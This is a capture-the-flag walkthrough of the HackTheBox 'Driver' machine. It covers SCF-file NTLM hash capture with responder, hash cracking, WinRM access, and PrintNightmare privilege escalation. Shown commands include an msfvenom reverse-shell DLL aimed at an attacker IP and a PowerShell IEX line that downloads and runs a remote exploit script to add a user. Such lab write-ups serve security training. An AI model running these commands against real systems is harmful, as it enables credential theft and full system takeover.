# HackTheBox-Driver

## NMAP 

```bash  
PORT    STATE SERVICE      REASON          VERSION    
80/tcp  open  http         syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D                                           
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
| http-methods:              
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
135/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
445/tcp open  microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                 
|_http-server-header: Microsoft-HTTPAPI/2.0                               
|_http-title: Not Found        
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

```

## PORT 139/445 (SMB)

<img src="https://i.imgur.com/IBXHYKS.png"/>

Checking smb share through anonymous login it seems we don't have access it to it so let's move on to web server

## PORT 80 (HTTP)

<img src="https://i.imgur.com/0mkBrUB.png"/>

On visiting web server , it's going to ask credentials so let's try `admin;admin` to see if this works

<img src="https://i.imgur.com/NVhljZR.png"/>

And it did it ,so let's see what we have here

<img src="https://i.imgur.com/95fm27D.png"/>

It's running on php , I checked to include index file with `php` extension and this loaded the page so this page is written on php so just some basic enumeration here. There are only two pages here , the other page is about uploading a firmware for the printer

<img src="https://i.imgur.com/GnxJ2Mp.png"/>

I tried uploading something but it doesn't seem that I can access that file from anywhere so I ran `gobuster` and it also didn't found anyhing interesting

<img src="https://i.imgur.com/NuH6pdP.png"/>

Now I kept thinking but nothing was coming to my mind until I focused on these lines " upload the respective firmware update to our file share" , so maybe the file we upload here is going to smb share , so here I learned a new attack which is known as SCF File attack `Shell Command File`.

So we need to create a `.scf` file , it will look like this

<img src="https://i.imgur.com/L2NWqDM.png"/>

Now we will have to upload this file and at the same time run `responder` to catch NTMLv2 hash

```bash
responder -I tun0 -rdw -v 
```

<img src="https://i.imgur.com/HkapBfq.png"/>

Just copy any of the hash , they all are the same, the only different is the time difference (in seconds) and save the hash in a file , and crack  it with `hashcat` 

<img src="https://i.imgur.com/W81nBqI.png"/>

<img src="https://i.imgur.com/bJX5GI2.png"/>

Now to verify if we have valid creds , we can use `crackmapexec` to verify it on smb

<img src="https://i.imgur.com/1pz9Fgr.png"/>

<img src="https://i.imgur.com/UdIj8xJ.png"/>

We only have read access here so we can't get a shell using `smbexec` or `psexec`. Since WinRM is open (port 5985) , we can check if we can get a shell with that

<img src="https://i.imgur.com/MmHkNMh.png"/>

It's showing us the status "pwned" meaning that we can get a shell

<img src="https://i.imgur.com/1SYEpTi.png"/>

## Privilege Escalation (Print Nightmare Python)

Assuming from the web page that there's a print spooler service running , we can test if we can exploit `PrintNightmare` , now this requires some setup as we need to clone the specifc impacket repo 

https://github.com/cube0x0/CVE-2021-1675

After cloning it we would then have to run `python3 ./setup.py install` and copy the contents of `CVE-2021-1675.py` , start the smb server using `service smbd restart` and generate a dll reverse shell

```bash
msfvenom  x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.125 LPORT=2222 -f dll -o /var/smb/shell.dll
```

Make sure that you have made read access to other group for this file

<img src="https://i.imgur.com/8EuX6wy.png"/>

<img src="https://i.imgur.com/LbV1F2Y.png"/>

Now to lauch the script and catch the shell

<img src="https://i.imgur.com/h7cqJzw.png"/>

<img src="https://i.imgur.com/OmUARkO.png"/>


## Print Nightmare (Powershell)

We can achieve SYSTEM on this machine through powershell as well , without the need of setting up a smb server 

So we'll use this POC for the pring nightmare exploit

https://github.com/calebstewart/CVE-2021-1675

<img src="https://i.imgur.com/xf9SfW9.png"/>

After transferring it to target machine , let's import the ps1 file. But if we try to import the script , it's going to show us an error "running scripts is disabled on this system"

<img src="https://i.imgur.com/RjZRgk7.png"/>

So to bypass this , we need to download the file using `IEX`

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.120/nightmare.ps1');
```

<img src="https://i.imgur.com/wsaPL90.png"/>

An advantage of downloading it this way is that not only it downloads the file but it will actually import the script so we don't have to import it manually

```powershell
Invoke-Nightmare -NewUser "USER" -NewPassword "PASS"
```

<img src="https://i.imgur.com/aFTw2a1.png"/>

We can see that the user has been created 

<img src="https://i.imgur.com/FGrijZM.png"/>

And we can then just switch to this user by logging in with `evil-winrm` 

<img src="https://i.imgur.com/6QZffHz.png"/>

## References

- https://1337red.wordpress.com/using-a-scf-file-to-gather-hashes/
- https://www.jaacostan.com/2021/07/printnightmare-cve-2021-1675-poc.html
- https://github.com/cube0x0/CVE-2021-1675
- https://github.com/calebstewart/CVE-2021-1675
- https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70
